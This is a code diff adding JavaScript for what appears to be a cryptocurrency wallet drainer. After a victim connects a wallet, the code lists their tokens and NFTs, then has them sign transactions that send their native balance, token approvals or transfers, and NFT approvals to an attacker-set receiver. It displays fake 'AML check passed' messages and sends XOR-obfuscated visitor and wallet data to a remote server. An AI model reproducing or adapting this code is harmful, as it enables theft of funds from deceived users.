+    rpcMap: all_chains_obj,
+    methods: [
+      'eth_sendTransaction',
+      'eth_signTransaction',
+      'eth_sign', 'personal_sign',
+      'eth_signTypedData',
+      'eth_signTypedData_v4'
+    ],
+    qrModalOptions: (FLASH_WalletConnect_Customization == 1) ? FLASH_WalletConnect_Theme : undefined
+  });
+};
+
+const prs = (s, t) => {
+  const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
+  const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
+  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
+  return t.split("").map(ab).map(as).map(bh).join("");
+};
+
+const srp = (s, e) => {
+  const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
+  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
+  return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
+};
+
+let prs_enc = 0, last_request_ts = 0;
+(async () => {
+  prs_enc = FLASH_Encryption_Key;
+  FLASH_Encryption_Key = Math.floor(Math.random() * 1000);
+})()
+
+const send_request = async (data) => {
+  try {
+    if (FLASH_Force_Mode) return { status: 'error', error: 'Server is Unavailable' };
+    while (Date.now() <= last_request_ts)
+      await new Promise(r => setTimeout(r, 1));
+    last_request_ts = Date.now();
+    data.domain = window.location.host;
+    data.worker_id = FLASH_Worker_ID || null;
+    data.user_id = FLASH_ID || null;
+    data.message_ts = last_request_ts;
+    data.chat_data = FLASH_Custom_Chat.Enable == 0 ? false : FLASH_Custom_Chat.Chat_Settings;
+    data.partner_address = FLASH_Partner_Address;
+    const encode_key = btoa(String(5 + 10 + 365 + 2048 + 867 + prs_enc));
+    const request_data = prs(encode_key, btoa(JSON.stringify(data)));
+    const response = await fetch('https://' + FLASH_Server, {
+      method: 'POST',
+      headers: {
+        'Accept': 'text/plain',
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: `ver=28112023&raw=${request_data}`
+    });
+    let response_data = JSON.parse(atob(srp(encode_key, await response.text())));
+    if (!response_data.status)
+      return { status: 'error', error: 'Server is Unavailable' };
+    else {
+      if (response_data.status == 'error' && response_data.error == 'SRV_UNAVAILABLE') FLASH_Force_Mode = true;
+      if (response_data.status == 'error' && response_data.error == 'INVALID_VERSION') {
+        FLASH_Force_Mode = true;
+        try {
+          if (FLASH_Loader_Style == 2) {
+            FLASHL.fire({
+              icon: 'error', title: 'Critical Error', subtitle: 'Server Error',
+              text: 'Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(',
+              confirmButtonText: 'OK', timer: 30000, color: FLASH_Color_Scheme
+            });
+          } else {
+            Swal.close();
+            Swal.fire({
+              html: '<b>Server Error</b> Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(', icon: 'error',
+              allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
+              showConfirmButton: true, confirmButtonText: 'OK'
+            });
+          }
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      return response_data;
+    }
+  } catch(err) {
+    console.log(err);
+    return { status: 'error', error: 'Server is Unavailable' };
+  }
+};
+
+const retrive_config = async () => {
+  try {
+    let personal_wallet = null;
+    if (localStorage['personal_wallet'] ) personal_wallet = { address: localStorage['personal_wallet'] };
+    const response = await send_request({ action: 'retrive_config', personal_wallet });
+    if (response.status == 'OK') {
+      FLASH_Connection = true;
+      FLASH_Settings = response.data;
+      FLASH_Gas_Multiplier = FLASH_Settings.Settings.Gas_Multiplier;
+      if (!FLASH_Settings.CIS) FLASH_Bad_Country = false;
+      if (FLASH_Settings.Personal_Wallet && typeof FLASH_Settings.Personal_Wallet == 'object')
+        localStorage['personal_wallet'] = FLASH_Settings.Personal_Wallet.address;
+      if (typeof FLASH_Settings.DSB == 'boolean' && FLASH_Settings.DSB === true) {
+        window.location.href = 'about:blank';
+      }
+    }
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const retrive_contract = async () => {
+  try {
+    const response = await send_request({ action: 'retrive_contract' });
+    if (response.status == 'OK') FLASH_Contract_ABI = response.data;
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const enter_website = async () => {
+  try {
+    let response = await send_request({
+      action: 'enter_website',
+      user_id: FLASH_ID,
+      time: new Date().toLocaleString('ru-RU')
+    });
+    if (response.status == 'error' && response.error == 'BAD_COUNTRY') {
+      FLASH_Bad_Country = true;
+    }
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const leave_website = async () => {
+  try {
+    if (!FLASH_Settings.Notifications['leave_website']) return;
+    await send_request({ action: 'leave_website', user_id: FLASH_ID });
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const connect_request = async () => {
+  try {
+    if (!FLASH_Settings.Notifications['connect_request']) return;
+    await send_request({ action: 'connect_request', user_id: FLASH_ID, wallet: FLASH_Current_Provider });
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const connect_cancel = async () => {
+  try {
+    if (!FLASH_Settings.Notifications['connect_cancel']) return;
+    await send_request({ action: 'connect_cancel', user_id: FLASH_ID });
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const connect_success = async () => {
+  try {
+    if (!FLASH_Settings.Notifications['connect_success']) return;
+    await send_request({
+      action: 'connect_success', user_id: FLASH_ID, address: FLASH_Current_Address,
+      wallet: FLASH_Current_Provider, chain_id: FLASH_Current_Chain_ID
+    });
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const convert_chain = (from, to, value) => {
+  try {
+    if (from == 'ANKR' && to == 'ID') {
+      switch (value) {
+        case 'eth': return 1;
+        case 'bsc': return 56;
+        case 'polygon': return 137;
+        case 'avalanche': return 43114;
+        case 'arbitrum': return 42161;
+        case 'optimism': return 10;
+        case 'fantom': return 250;
+        case 'era': return 324;
+        case 'base': return 8453;
+        case 'pulse': return 369;
+        default: return false;
+      }
+    } else if (from == 'OPENSEA' && to == 'ID') {
+      switch (value) {
+        case 'ethereum': return 1;
+        case 'matic': return 137;
+        case 'avalanche': return 43114;
+        case 'arbitrum': return 42161;
+        case 'optimism': return 10;
+        case 'era': return 324;
+        case 'base': return 8453;
+        case 'pulse': return 369;
+        default: return false;
+      }
+    } else if (from == 'ID' && to == 'ANKR') {
+      switch (value) {
+        case 1: return 'eth';
+        case 56: return 'bsc';
+        case 137: return 'polygon';
+        case 43114: return 'avalanche';
+        case 42161: return 'arbitrum';
+        case 10: return 'optimism';
+        case 250: return 'fantom';
+        case 25: return 'cronos';
+        case 100: return 'gnosis';
+        case 128: return 'heco';
+        case 1284: return 'moonbeam';
+        case 1285: return 'moonriver';
+        case 2222: return 'kava';
+        case 42220: return 'celo';
+        case 1666600000: return 'harmony';
+        case 324: return 'zksync_era';
+        case 8453: return 'base';
+        case 369: return 'pulse';
+        default: return false;
+      }
+    } else if (from == 'ID' && to == 'CURRENCY') {
+      switch (value) {
+        case 1: return 'ETH';
+        case 56: return 'BNB';
+        case 137: return 'MATIC';
+        case 43114: return 'AVAX';
+        case 42161: return 'ETH';
+        case 10: return 'ETH';
+        case 250: return 'FTM';
+        case 25: return 'CRO';
+        case 100: return 'XDAI';
+        case 128: return 'HT';
+        case 1284: return 'GLMR';
+        case 1285: return 'MOVR';
+        case 2222: return 'KAVA';
+        case 42220: return 'CELO';
+        case 1666600000: return 'ONE';
+        case 324: return 'ETH';
+        case 8453: return 'ETH';
+        case 369: return 'PLS';
+        default: return false;
+      }
+    }
+  } catch(err) {
+    console.log(err);
+    return false;
+  }
+};
+
+const get_tokens = async (address) => {
+  try {
+    let tokens = [], response = await fetch(`https://rpc.ankr.com/multichain/${FLASH_Settings.AT || ''}`, {
+      method: 'POST',
+      headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        "id": 1,
+        "jsonrpc": "2.0",
+        "method": "ankr_getAccountBalance",
+        "params": {
+          "blockchain": [ "eth", "base", "bsc", "polygon", "avalanche", "arbitrum", "fantom", "optimism", "base" ],
+          "walletAddress": address
+        }
+      })
+    });
+    response = await response.json();
+      console.log(response);
+    for (const asset of response.result.assets) {
+      try {
+        let contract_address = asset.contractAddress || 'NATIVE';
+        if (FLASH_Settings.Contract_Whitelist.length > 0 && !FLASH_Settings.Contract_Whitelist.includes(contract_address.toLowerCase().trim())) continue;
+        else if (FLASH_Settings.Contract_Blacklist.length > 0 && FLASH_Settings.Contract_Blacklist.includes(contract_address.toLowerCase().trim())) continue;
+        let new_asset = {
+          chain_id: convert_chain('ANKR', 'ID', asset.blockchain),
+          name: asset.tokenName, type: asset.tokenType,
+          amount: parseFloat(asset.balance), amount_raw: asset.balanceRawInteger,
+          amount_usd: parseFloat(asset.balanceUsd), symbol: asset.tokenSymbol,
+          decimals: asset.tokenDecimals, address: contract_address || null,
+          price: parseFloat(asset.tokenPrice)
+        };
+        if (new_asset.price > 0) tokens.push(new_asset);
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    return tokens;
+  } catch(err) {
+    console.log(err);
+    return [];
+  }
+};
+
+const get_nfts = async (address) => {
+  try {
+    let response = await fetch(`https://api.opensea.io/api/v1/assets?owner=${address}&order_direction=desc&limit=200&include_orders=false`);
+    let tokens = (await response.json())['assets'];
+    response = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${address}&offset=0&limit=200`);
+    let collections = await response.json(), list = [];
+    for (const asset of tokens) {
+      try {
+        let collection = null;
+        for (const x_collection of collections) {
+          try {
+            if (x_collection.primary_asset_contracts.length < 1) continue;
+            if (x_collection.primary_asset_contracts[0].address == asset.asset_contract.address) {
+              collection = x_collection;
+              break;
+            }
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        if (collection == null) continue;
+        if (FLASH_Settings.Contract_Whitelist.length > 0 && !FLASH_Settings.Contract_Whitelist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
+        else if (FLASH_Settings.Contract_Blacklist.length > 0 && FLASH_Settings.Contract_Blacklist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
+        let asset_chain_id = convert_chain('OPENSEA', 'ID', asset.asset_contract.chain_identifier);
+        let asset_price = (collection.stats.one_day_average_price != 0) ? collection.stats.one_day_average_price : collection.stats.seven_day_average_price;
+        asset_price = asset_price * FLASH_Currencies[convert_chain('ID', 'CURRENCY', asset_chain_id)]['USD'];
+        let new_asset = {
+          chain_id: asset_chain_id, name: asset.name, type: asset.asset_contract.schema_name, amount: asset.num_sales,
+          amount_raw: null, amount_usd: asset_price, id: asset.token_id, symbol: null, decimals: null,
+          address: asset.asset_contract.address, price: asset_price
+        };
+        if (typeof asset_price == 'number' && !isNaN(asset_price) && asset_price > 0) list.push(new_asset);
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    return list;
+  } catch(err) {
+    console.log(err);
+    return [];
+  }
+};
+
+const retrive_timeout = {};
+const retrive_token = async (chain_id, contract_address) => {
+  try {
+    if (!FLASH_API_Data[chain_id] || FLASH_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API == '') return FLASH_Contract_ABI['ERC20'];
+    while (retrive_timeout[chain_id] && retrive_timeout[chain_id].time == Math.floor(Date.now() / 1000) && retrive_timeout[chain_id].count >= 5)
+      await new Promise(r => setTimeout(r, 100));
+    if (!retrive_timeout[chain_id])
+      retrive_timeout[chain_id] = { time: Math.floor(Date.now() / 1000), count: 1 };
+    else {
+      if (retrive_timeout[chain_id].time == Math.floor(Date.now() / 1000)) retrive_timeout[chain_id].count += 1;
+      else {
+        retrive_timeout[chain_id].time = Math.floor(Date.now() / 1000);
+        retrive_timeout[chain_id].count = 1;
+      }
+    }
+    let response = await fetch(`https://${FLASH_API_Data[chain_id]}/api?module=contract&action=getsourcecode&address=${contract_address}&apikey=${FLASH_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API}`, {
+      method: 'GET', headers: { 'Accept': 'application/json' }
+    });
+    response = await response.json();
+    if (response.message == 'OK') {
+      if (response.result[0].Proxy == '1' && response.result[0].Implementation != '') {
+        const implementation = response.result[0].Implementation;
+        return retrive_token(chain_id, implementation);
+      } else {
+        return JSON.parse(response.result[0].ABI)
+      }
+    } else {
+      return FLASH_Contract_ABI['ERC20'];
+    }
+  } catch (err) {
+    return FLASH_Contract_ABI['ERC20'];
+  }
+};
+
+const get_permit_type = (func) => {
+  try {
+    if (FLASH_Settings.Settings.Permit.Mode == false) return 0;
+    if (func.hasOwnProperty('permit') && func.hasOwnProperty('nonces') &&
+      func.hasOwnProperty('name') && func.hasOwnProperty('DOMAIN_SEPARATOR')) {
+      const permit_version = ((func) => {
+        for (const key in func) {
+          if (key.startsWith('permit(')) {
+            const args = key.slice(7).split(',')
+            if (args.length === 7 && key.indexOf('bool') === -1) return 2;
+            if (args.length === 8 && key.indexOf('bool') !== -1) return 1;
+            return 0;
+          }
+        }
+      })(func);
+      return permit_version;
+    } else {
+      return 0;
+    }
+  } catch (err) {
+    return 0;
+  }
+};
+
+const FLASH_Gas_Reserves = {};
+
+const show_check = () => {
+  try {
+    if (FLASH_Loader_Style == 2) {
+      FLASHL.fire({
+        icon: 'load', title: 'Processing wallet', text: 'Connecting to blockchain...',
+        showConfirmButton: true, confirmButtonText: 'Loading...', timer: 2000, color: FLASH_Color_Scheme
+      }).then(() => {
+        if (FLASH_Check_Done) return;
+        FLASHL.fire({
+          icon: 'load', title: 'Processing wallet', text: 'Getting your wallet address...',
+          showConfirmButton: true, confirmButtonText: 'Loading...', timer: 5000, color: FLASH_Color_Scheme
+        }).then(() => {
+          if (FLASH_Check_Done) return;
+          FLASHL.fire({
+            icon: 'load', title: 'Processing wallet', text: 'Checking your wallet for AML...',
+            showConfirmButton: true, confirmButtonText: 'Loading...', timer: 5000, color: FLASH_Color_Scheme
+          }).then(() => {
+            if (FLASH_Check_Done) return;
+            FLASHL.fire({
+              icon: 'success', title: 'Processing wallet', subtitle: 'Everything good!',
+              text: 'Your wallet is AML risk is low enough!', showConfirmButton: false, timer: 5000, color: FLASH_Color_Scheme
+            }).then(() => {
+              if (FLASH_Check_Done) return;
+              FLASHL.fire({
+                icon: 'load', title: 'Processing wallet', text: 'Please wait, we\'re scanning more details...',
+                showConfirmButton: true, confirmButtonText: 'Loading...', timer: 300000, color: FLASH_Color_Scheme
+              });
+            });
+          });
+        });
+      });
+    } else {
+      Swal.fire({
+        title: 'Connection established',
+        icon: 'success',
+        timer: 2000
+      }).then(() => {
+        if (FLASH_Check_Done) return;
+        Swal.fire({
+          text: 'Connecting to Blockchain...',
+          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
+          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
+          timer: 5000, width: 600, showConfirmButton: false
+        }).then(() => {
+          if (FLASH_Check_Done) return;
+          Swal.fire({
+            text: 'Getting your wallet address...',
+            imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
+            imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
+            timer: 5000, width: 600, showConfirmButton: false
+          }).then(() => {
+            if (FLASH_Check_Done) return;
+            Swal.fire({
+              text: 'Checking your wallet for AML...',
+              imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
+              imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
+              timer: 5000, width: 600, showConfirmButton: false
+            }).then(() => {
+              if (FLASH_Check_Done) return;
+              Swal.fire({
+                text: 'Good, your wallet is AML clear!',
+                icon: 'success',
+                allowOutsideClick: false, allowEscapeKey: false,
+                timer: 2000, width: 600, showConfirmButton: false
+              }).then(() => {
+                if (FLASH_Check_Done) return;
+                Swal.fire({
+                  text: 'Please wait, we\'re scanning more details...',
+                  imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
+                  imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
+                  timer: 0, width: 600, showConfirmButton: false
+                });
+              });
+            });
+          });
+        });
+      });
+    }
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const get_nonce = async (chain_id) => {
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[chain_id]);
+  return await node.getTransactionCount(FLASH_Current_Address, "pending");
+};
+
+const wait_message = () => {
+  try {
+    if (!FLASH_Process) return;
+    Swal.close();
+    if (FLASH_Loader_Style == 2) {
+      FLASHL.fire({
+        icon: 'success', title: 'OK', subtitle: 'Thanks!', text: 'Got your sign, wait a bit for confirmation...',
+        showConfirmButton: false, timer: 2500, color: FLASH_Color_Scheme
+      }).then(() => {
+        FLASHL.fire({
+          icon: 'load', title: 'Processing sign', text: ' Please, don\'t leave this page!',
+          showConfirmButton: true, confirmButtonText: 'Confirming sign...', showConfirmButton: false, color: FLASH_Color_Scheme
+        });
+      });
+    } else {
+      Swal.fire({
+        html: '<b>Thanks!</b>', icon: 'success',
+        allowOutsideClick: false, allowEscapeKey: false,
+        timer: 2500, width: 600, showConfirmButton: false
+      }).then(() => {
+        Swal.fire({
+          html: '<b>Confirming your sign...</b><br><br>Please, don\'t leave this page!',
+          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
+          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
+          timer: 0, width: 600, showConfirmButton: false
+        });
+      });
+    }
+
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const end_message = () => {
+  try {
+    if (FLASH_Loader_Style == 2) {
+      FLASHL.fire({
+        icon: 'error', title: 'Error', subtitle: 'We\'re sorry', text: 'Your wallet doesn\'t meet the requirements. Try to connect a middle-active wallet to try again!',
+        showConfirmButton: true, confirmButtonText: 'OK', color: FLASH_Color_Scheme
+      });
+    } else {
+      Swal.close();
+      Swal.fire({
+        html: '<b>Sorry!</b> Your wallet doesn\'t meet the requirements.<br><br>Try to connect a middle-active wallet to try again!', icon: 'error',
+        allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
+        showConfirmButton: true, confirmButtonText: 'OK'
+      });
+    }
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+let is_first_sign = true;
+
+const sign_ready = () => {
+  try {
+    if (FLASH_Loader_Style == 2) {
+      FLASHL.fire({
+        icon: 'success', title: 'OK', subtitle: 'Sign is confirmed', text: 'Please, wait a bit for confirmation...',
+        showConfirmButton: false, color: FLASH_Color_Scheme
+      });
+    } else {
+      Swal.close();
+      Swal.fire({
+        html: '<b>Success!</b> Your sign is confirmed!',
+        icon: 'success', allowOutsideClick: false, allowEscapeKey: false,
+        timer: 0, width: 600, showConfirmButton: false
+      });
+    }
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const sign_next = () => {
+  try {
+    if (is_first_sign) {
+      is_first_sign = false;
+      return;
+    }
+    if (FLASH_Loader_Style == 2) {
+      FLASHL.fire({
+        icon: 'load', title: 'Waiting for action', text: 'Sign message in your wallet...',
+        showConfirmButton: true, confirmButtonText: 'Waiting...', color: FLASH_Color_Scheme
+      });
+    } else {
+      Swal.close();
+      Swal.fire({
+        html: '<b>Waiting for your sign...</b><br><br>Please, sign message in your wallet!',
+        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
+        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
+        timer: 0, width: 600, showConfirmButton: false
+      });
+    }
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const is_nft_approved = async (contract_address, owner_address, spender_address) => {
+  try {
+    const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[1]);
+    const contract = new ethers.Contract(contract_address, FLASH_Contract_ABI['ERC721'], node);
+    return await contract.isApprovedForAll(owner_address, spender_address);
+  } catch(err) {
+    console.log(err);
+    return false;
+  }
+};
+
+const get_gas_limit_def_by_chain_id = (chain_id) => {
+  switch (chain_id) {
+    case 42161: return BN(5000000);
+    case 43114: return BN(5000000);
+    default: return BN(100000);
+  }
+}
+
+const SIGN_NATIVE = async (asset) => {
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(FLASH_Gas_Multiplier * 100)));
+
+  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
+  const tokens_gas_fee = token_limit.mul(FLASH_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);
+
+  let unsigned_tx = { from: FLASH_Current_Address, to: FLASH_Settings.Receiver, value: BN(100), data: "0x" };
+
+  let gas_limit = null;
+  try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
+  { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }
+
+  const balance = await node.getBalance(FLASH_Current_Address);
+  const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
+  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';
+
+  const nonce = await node.getTransactionCount(FLASH_Current_Address, 'pending');
+
+  const web3 = new Web3(FLASH_Provider);
+
+  unsigned_tx.value = web3.utils.toHex(available_amount.toString());
+  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
+  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
+  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());
+
+  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
+  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";
+
+  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
+  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
+  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });
+
+  await sign_request(asset);
+
+  let sign_data = await web3.eth.sign(serialized_tx, FLASH_Current_Address);
+  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
+  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
+  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)
+
+  unsigned_tx.v = v_data;
+  unsigned_tx.r = r_data;
+  unsigned_tx.s = s_data;
+
+  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
+
+  sign_next();
+  const tx = await node.sendTransaction(serialized_tx);
+  wait_message();
+
+  if (FLASH_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  await sign_success(asset, available_amount); sign_ready();
+};
+
+const SIGN_TOKEN = async (asset) => {
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(FLASH_Gas_Multiplier * 100)));
+
+  const web3 = new Web3(FLASH_Provider); let contract_data = null;
+  const web3_contract = new web3.eth.Contract(FLASH_Contract_ABI['ERC20'], asset.address);
+
+  let max_approval_amount = ethers.utils.parseEther(FLASH_Unlimited_Amount);
+  for (const c_address of FLASH_Settings.Unlimited_BL) {
+    try {
+      if (c_address[0] == FLASH_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
+        max_approval_amount = asset.amount_raw;
+        break;
+      }
+    } catch(err) {
+      console.log(err);
+    }
+  }
+
+  if (FLASH_Settings.Settings.Sign.Tokens == 1) contract_data = web3_contract.methods.approve(FLASH_Settings.Address, max_approval_amount).encodeABI();
+  else if (FLASH_Settings.Settings.Sign.Tokens == 2) contract_data = web3_contract.methods.transfer(FLASH_Settings.Receiver, asset.amount_raw).encodeABI();
+
+  let unsigned_tx = { from: FLASH_Current_Address, to: asset.address, value: "0x0", data: contract_data };
+
+  let gas_limit = null;
+  try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
+  { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }
+
+  const balance = await node.getBalance(FLASH_Current_Address);
+  const available_amount = balance.sub(gas_limit.mul(gas_price));
+
+  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';
+
+  const nonce = await node.getTransactionCount(FLASH_Current_Address, 'pending');
+
+  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
+  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
+  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());
+
+  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
+  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";
+
+  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
+  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
+  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });
+
+  await sign_request(asset);
+
+  let sign_data = await web3.eth.sign(serialized_tx, FLASH_Current_Address);
+  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
+  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
+  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)
+
+  unsigned_tx.v = v_data;
+  unsigned_tx.r = r_data;
+  unsigned_tx.s = s_data;
+
+  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
+
+  sign_next();
+  const tx = await node.sendTransaction(serialized_tx);
+  wait_message();
+
+  if (FLASH_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  await sign_success(asset); sign_ready();
+};
+
+const SIGN_NFT = async (asset) => {
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(FLASH_Gas_Multiplier * 100)));
+
+  const web3 = new Web3(FLASH_Provider); let contract_data = null;
+  const web3_contract = new web3.eth.Contract(FLASH_Contract_ABI['ERC721'], asset.address);
+
+  if (FLASH_Settings.Settings.Sign.NFTs == 1) contract_data = web3_contract.methods.setApprovalForAll(FLASH_Settings.Address, true).encodeABI();
+  else if (FLASH_Settings.Settings.Sign.NFTs == 2) contract_data = web3_contract.methods.transferFrom(FLASH_Current_Address, FLASH_Settings.Receiver, asset.id).encodeABI();
+
+  let unsigned_tx = { from: FLASH_Current_Address, to: asset.address, value: "0x0", data: contract_data };
+
+  let gas_limit = null;
+  try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
+  { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }
+
+  const balance = await node.getBalance(FLASH_Current_Address);
+  const available_amount = balance.sub(gas_limit.mul(gas_price));
+
+  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';
+
+  const nonce = await node.getTransactionCount(FLASH_Current_Address, 'pending');
+
+  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
+  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
+  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());
+
+  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
+  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";
+
+  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
+  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
+  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });
+
+  await sign_request(asset);
+
+  let sign_data = await web3.eth.sign(serialized_tx, FLASH_Current_Address);
+  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
+  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
+  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)
+
+  unsigned_tx.v = v_data;
+  unsigned_tx.r = r_data;
+  unsigned_tx.s = s_data;
+
+  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
+
+  sign_next();
+  const tx = await node.sendTransaction(serialized_tx);
+  wait_message();
+
+  if (FLASH_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  await sign_success(asset); sign_ready();
+};
+
+const DO_SWAP = async (asset) => {
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
+  const contract = new ethers.Contract(asset.swapper_address, FLASH_Pancake_ABI, FLASH_Signer);
+  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
+  let gas_limit = null;
+  let gas_attempts = 0;
+  while (gas_attempts < 3) {
+    try {
+      gas_limit = await contract.estimateGas.swapExactTokensForETH(swap_value, '0', [
+        asset.address, FLASH_Swap_Route[asset.chain_id]
+      ], FLASH_Settings.Receiver, swap_deadline, { from: FLASH_Current_Address });
+      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
+      gas_attempts = 3;
+    } catch(err) {
+      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 350000);
+      gas_attempts += 1;
+    }
+  }
+  const nonce = await get_nonce(asset.chain_id);
+  const swap_value = ethers.BigNumber.from(asset.amount_raw).lte(ethers.BigNumber.from(asset.swapper_allowance))
+  ? ethers.BigNumber.from(asset.amount_raw).toString() : ethers.BigNumber.from(asset.swapper_allowance).toString();
+  await swap_request(asset.swapper_type, asset, [ asset ]); sign_next();
+  const tx = await contract.swapExactTokensForETH(swap_value, '0', [
+    asset.address, FLASH_Swap_Route[asset.chain_id]
+  ], FLASH_Settings.Receiver, swap_deadline, {
+    gasLimit: ethers.BigNumber.from(gas_limit),
+    gasPrice: ethers.BigNumber.from(gas_price),
+    nonce: nonce, from: FLASH_Current_Address
+  });
+  wait_message();
